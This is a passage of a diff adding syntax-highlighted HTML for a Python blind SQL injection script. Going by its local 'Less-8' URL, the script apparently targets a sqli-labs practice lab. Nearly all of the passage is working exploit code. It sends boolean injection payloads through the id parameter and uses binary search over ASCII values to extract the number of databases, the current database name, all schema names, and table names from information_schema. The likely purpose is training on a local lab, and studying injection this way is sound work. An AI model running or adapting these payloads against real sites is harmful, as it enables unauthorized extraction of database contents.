+</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+(select+</span><span class=si>{}</span><span class=s2>=(select count(*) from information_schema.schemata))--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Db_number:&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_Current_DbName</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>table_list</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>        <span class=c1>#二分法获取数据库名</span>
+</span></span><span class=line><span class=cl>        <span class=n>Namelen</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>get_Current_Db_Len</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=n>TempLen</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>        <span class=n>DbName</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=n>temp_bottom</span> <span class=o>=</span> <span class=mi>33</span>
+</span></span><span class=line><span class=cl>                <span class=n>temp_top</span> <span class=o>=</span> <span class=mi>126</span>
+</span></span><span class=line><span class=cl>                <span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                    <span class=c1>#当前ascii小于temp_top</span>
+</span></span><span class=line><span class=cl>                    <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+((ascii(substr(database(),</span><span class=si>{}</span><span class=s2>,1))) &lt; </span><span class=si>{}</span><span class=s2>)--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>TempLen</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>                    <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=c1># print(final_payload)</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=n>temp_top</span> <span class=o>=</span> <span class=p>(</span><span class=n>temp_top</span><span class=o>-</span><span class=n>ceil</span><span class=p>((</span><span class=n>temp_top</span><span class=o>-</span><span class=n>temp_bottom</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                        <span class=c1>#循环开始后上一次的两个边界之间的差值(作为bottom变化时的标记)</span>
+</span></span><span class=line><span class=cl>                        <span class=n>interval</span> <span class=o>=</span> <span class=n>ceil</span><span class=p>((</span><span class=n>temp_top</span><span class=o>-</span><span class=n>temp_bottom</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>continue</span>
+</span></span><span class=line><span class=cl>                    <span class=c1>#当前ascii大于temp_top</span>
+</span></span><span class=line><span class=cl>                    <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+((ascii(substr(database(),</span><span class=si>{}</span><span class=s2>,1))) &gt; </span><span class=si>{}</span><span class=s2>)--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>TempLen</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>                    <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=n>temp_bottom</span> <span class=o>=</span> <span class=n>temp_top</span>
+</span></span><span class=line><span class=cl>                        <span class=n>temp_top</span> <span class=o>=</span> <span class=n>temp_top</span> <span class=o>+</span> <span class=n>interval</span>
+</span></span><span class=line><span class=cl>                        <span class=k>continue</span>
+</span></span><span class=line><span class=cl>                    <span class=c1>#当前ascii等于temp_top</span>
+</span></span><span class=line><span class=cl>                    <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+((ascii(substr(database(),</span><span class=si>{}</span><span class=s2>,1))) = </span><span class=si>{}</span><span class=s2>)--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>TempLen</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>                    <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>interval</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=n>exit</span><span class=p>(</span><span class=s2>&#34;unknown error about variable interval&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=n>DbName</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Database_name:&#34;</span><span class=o>+</span><span class=n>DbName</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=n>TempLen</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>TempLen</span> <span class=o>==</span> <span class=n>Namelen</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=n>table_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;Database_name:&#34;</span><span class=o>+</span><span class=n>DbName</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Unknown error:&#34;</span><span class=p>,</span><span class=n>e</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>table_list</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_All_Db_Name</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>number</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>get_All_Db_Number</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=n>Database_list</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>number</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>Database_Name</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=c1>#二分法获取每个数据库名</span>
+</span></span><span class=line><span class=cl>            <span class=n>Namelen</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>get_All_Db_Len</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>TempLen</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                    <span class=n>temp_bottom</span> <span class=o>=</span> <span class=mi>33</span>
+</span></span><span class=line><span class=cl>                    <span class=n>temp_top</span> <span class=o>=</span> <span class=mi>126</span>
+</span></span><span class=line><span class=cl>                    <span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                        <span class=c1>#当前ascii小于temp_top</span>
+</span></span><span class=line><span class=cl>                        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+(ascii(substr((select schema_name from information_schema.schemata limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)) &lt; </span><span class=si>{}</span><span class=s2>)--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>TempLen</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>                        <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=c1># print(final_payload)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                            <span class=n>temp_top</span> <span class=o>=</span> <span class=p>(</span><span class=n>temp_top</span><span class=o>-</span><span class=n>ceil</span><span class=p>((</span><span class=n>temp_top</span><span class=o>-</span><span class=n>temp_bottom</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                            <span class=c1>#循环开始后上一次的两个边界之间的差值(作为bottom变化时的标记)</span>
+</span></span><span class=line><span class=cl>                            <span class=n>interval</span> <span class=o>=</span> <span class=n>ceil</span><span class=p>((</span><span class=n>temp_top</span><span class=o>-</span><span class=n>temp_bottom</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>                        <span class=c1>#当前ascii大于temp_top</span>
+</span></span><span class=line><span class=cl>                        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+(ascii(substr((select schema_name from information_schema.schemata limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)) &gt; </span><span class=si>{}</span><span class=s2>)--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>TempLen</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>                        <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                            <span class=n>temp_bottom</span> <span class=o>=</span> <span class=n>temp_top</span>
+</span></span><span class=line><span class=cl>                            <span class=n>temp_top</span> <span class=o>=</span> <span class=n>temp_top</span> <span class=o>+</span> <span class=n>interval</span>
+</span></span><span class=line><span class=cl>                            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>                        <span class=c1>#当前ascii等于temp_top</span>
+</span></span><span class=line><span class=cl>                        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+(ascii(substr((select schema_name from information_schema.schemata limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)) = </span><span class=si>{}</span><span class=s2>)--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>TempLen</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>                        <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=n>interval</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                            <span class=n>exit</span><span class=p>(</span><span class=s2>&#34;unknown error about variable interval&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                            <span class=n>Database_Name</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Database_name:&#34;</span><span class=o>+</span><span class=n>Database_Name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                            <span class=n>TempLen</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>                            <span class=k>break</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>TempLen</span> <span class=o>==</span> <span class=n>Namelen</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=n>Database_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;Database_name:&#34;</span><span class=o>+</span><span class=n>Database_Name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Unknown error:&#34;</span><span class=p>,</span><span class=n>e</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>Database_list</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_CurrentDb_Table_Number</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>20</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+(select+</span><span class=si>{}</span><span class=s2>=(select+count(*)+from+information_schema.tables+where+table_schema=database()))--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Table_number:&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_CurrentDb_TableName_Len</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span><span class=n>table_number</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>20</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+(select+((select+length(concat(table_name))+from+information_schema.tables+where+table_schema=database()+limit+</span><span class=si>{}</span><span class=s2>,1)=</span><span class=si>{}</span><span class=s2>))--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>table_number</span><span class=p>,</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;TableName_number:&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_CurrentDb_Table_Name</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>number</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>get_CurrentDb_Table_Number</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=n>table_list</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>number</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>table_name</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=c1>#二分法获取每个表名</span>
+</span></span><span class=line><span class=cl>            <span class=n>Namelen</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>get_CurrentDb_TableName_Len</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>TempLen</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                    <span class=n>temp_bottom</span> <span class=o>=</span> <span class=mi>33</span>
+</span></span><span class=line><span class=cl>                    <span class=n>temp_top</span> <span class=o>=</span> <span class=mi>126</span>
+</span></span><span class=line><span class=cl>                    <span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                        <span class=c1>#当前ascii小于temp_top</span>
+</span></span><span class=line><span class=cl>                        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)) &lt; </span><span class=si>{}</span><span class=s2>)--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>TempLen</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>                        <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=c1># print(final_payload)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                            <span class=n>temp_top</span> <span class=o>=</span> <span class=p>(</span><span class=n>temp_top</span><span class=o>-</span><span class=n>ceil</span><span class=p>((</span><span class=n>temp_top</span><span class=o>-</span><span class=n>temp_bottom</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                            <span class=c1>#循环开始后上一次的两个边界之间的差值(作为bottom变化时的标记)</span>
+</span></span><span class=line><span class=cl>                            <span class=n>interval</span> <span class=o>=</span> <span class=n>ceil</span><span class=p>((</span><span class=n>temp_top</span><span class=o>-</span><span class=n>temp_bottom</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>                        <span class=c1>#当前ascii大于temp_top</span>
+</span></span><span class=line><span class=cl>                        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)) &gt; </span><span class=si>{}</span><span class=s2>)--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>TempLen</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>                        <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                            <span class=n>temp_bottom</span> <span class=o>=</span> <span class=n>temp_top</span>
+</span></span><span class=line><span class=cl>                            <span class=n>temp_top</span> <span class=o>=</span> <span class=n>temp_top</span> <span class=o>+</span> <span class=n>interval</span>
+</span></span><span class=line><span class=cl>                            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>                        <span class=c1>#当前ascii等于temp_top</span>
+</span></span><span class=line><span class=cl>                        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)) = </span><span class=si>{}</span><span class=s2>)--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>TempLen</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>                        <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=n>interval</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                            <span class=n>exit</span><span class=p>(</span><span class=s2>&#34;unknown error about variable interval&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                            <span class=n>table_name</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>temp_top</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Table_name:&#34;</span><span class=o>+</span><span class=n>table_name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                            <span class=n>TempLen</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>                            <span class=k>break</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>TempLen</span> <span class=o>==</span> <span class=n>Namelen</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=n>table_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;Table_name:&#34;</span><span class=o>+</span><span class=n>table_name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Unknown error:&#34;</span><span class=p>,</span><span class=n>e</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>table_list</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://127.0.0.1:8081/Less-8/&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>word1</span><span class=o>=</span><span class=s2>&#34;You are in&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>word2</span><span class=o>=</span><span class=s2>&#34;You are not in&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>sqli</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span><span class=n>word1</span><span class=o>=</span><span class=n>word1</span><span class=p>,</span><span class=n>word2</span><span class=o>=</span><span class=n>word2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>one</span> <span class=o>=</span> <span class=nb>float</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>sqli</span><span class=o>.</span><span class=n>get_CurrentDb_Table_Name</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>two</span> <span class=o>=</span> <span class=nb>float</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>interval</span> <span class=o>=</span> <span class=n>two</span><span class=o>-</span><span class=n>one</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>interval</span><span class=p>)</span>
